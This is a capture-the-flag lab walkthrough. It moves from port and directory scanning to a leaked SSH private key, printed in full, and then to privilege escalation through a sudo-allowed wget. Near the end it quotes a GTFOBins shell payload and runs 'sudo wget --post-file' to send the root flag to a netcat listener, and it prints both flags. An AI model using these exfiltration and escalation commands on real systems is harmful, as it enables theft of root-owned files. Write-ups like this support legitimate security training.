#CTF 

_Can you exfiltrate the root flag?_

## Recon

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
===============================================================
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 11374]
/sitemap              (Status: 301) [Size: 314] [--> http://10.10.18.141/sitemap/]                                                              
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 882240 / 882244 (100.00%)
===============================================================
```

And in the sitemap subdirectory

```
/images               (Status: 301) [Size: 321] [--> http://10.10.18.141/sitemap/images/]                                                       
/contact.html         (Status: 200) [Size: 10346]
/.html                (Status: 403) [Size: 277]
/about.html           (Status: 200) [Size: 12232]
/index.html           (Status: 200) [Size: 21080]
/blog.html            (Status: 200) [Size: 12745]
/services.html        (Status: 200) [Size: 10131]
/shop.html            (Status: 200) [Size: 17257]
/css                  (Status: 301) [Size: 318] [--> http://10.10.18.141/sitemap/css/]
/work.html            (Status: 200) [Size: 11428]
/js                   (Status: 301) [Size: 317] [--> http://10.10.18.141/sitemap/js/]
/fonts                (Status: 301) [Size: 320] [--> http://10.10.18.141/sitemap/fonts/]
/.html                (Status: 403) [Size: 277]
/sass                 (Status: 301) [Size: 319] [--> http://10.10.18.141/sitemap/sass/]
```

## Access 

Looking at the code of the site I see this comment on the html
`<!-- Jessie don't forget to udate the webiste -->`
So maybe I have a username
Then I look around a bit on the site , on the subdirectories of sitemap. I cant find something , so I run gobuster and get 
```
/.ssh                 (Status: 301) [Size: 319] [--> http://10.10.40.200/sitemap/.ssh/]
```

So I go to .ssh
and find the id_rsa key
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
```

So I  make a file id_rsa
```
sudo chmod 600 id_rsa 
ssh -i id_rsa jessie@[ip]
```

And I am in! I find my flag under Documents
`057c67131c3d5e42dd5cd3075b198ff6`


## Priv Esc

With sudo -l I get
```
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

SO I go to gtfo bins and find this
```
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
```

but I couldnt execute the last one
```
wget: unrecognized option '--use-askpass=/tmp/tmp.cghjh8alb0'
Usage: wget [OPTION]... [URL]...

Try `wget --help' for more options.
```

So I tried the file upload 
```
URL=http://attacker.com/file_to_get
LFILE=file_to_save
wget $URL -O $LFILE
```

To do the above I open a nc connection on my machine and then on the other terminal I type
`sudo wget --post-file=/root/root_flag.txt http://[local ip]:1234`
And on my netcat I get the flag!
`b1b968b37519ad1daa6408188649263d`